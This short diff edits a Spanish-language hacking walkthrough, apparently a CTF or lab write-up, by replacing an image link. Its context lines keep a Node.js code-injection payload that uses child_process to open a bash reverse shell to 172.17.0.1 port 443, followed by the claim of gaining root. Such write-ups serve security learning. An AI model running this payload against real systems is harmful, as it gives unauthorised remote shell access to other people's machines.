@@ -72,6 +72,7 @@ pero no somos root absoluto, modificamos el código para una reverse shell
 
     - exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1\"')")
 
-![[root absolute.png]]
+![image](https://github.com/user-attachments/assets/119aa68f-4cb6-4dfd-b1ce-5d3d4f717e32)
+
 
 y somos root!
